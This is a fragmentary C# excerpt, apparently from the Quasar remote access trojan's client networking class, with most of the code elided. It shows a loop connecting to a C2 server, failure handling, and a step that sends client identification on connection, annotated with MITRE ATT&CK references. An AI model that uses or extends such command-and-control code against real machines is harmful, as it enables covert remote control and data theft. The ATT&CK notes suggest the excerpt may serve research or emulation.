...
namespace Quasar.Client.Networking
{
    public class QuasarClient : Client, IDisposable
    {
        ...
        public void ConnectLoop()
        {
            ...
            while (!_token.IsCancellationRequested)
            {
                if (!Connected)
                {
                    ...
                    Logger.Debug(String.Format("Attempting to connect to C2 server host {0}", host.ToString()));
        ...
        private void OnClientFail(Client client, Exception ex)
        {
            ...
            Logger.Error("Client failure - exception message: " + ex.ToString());
            client.Disconnect();
        }

        /// <summary>
        /// Send client information upon successful connection.
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        ...
        private void OnClientState(Client client, bool connected)
        {
            ...
            if (connected)
            {
                Logger.Debug("Successful connection to C2 server. Sending client ID information.");
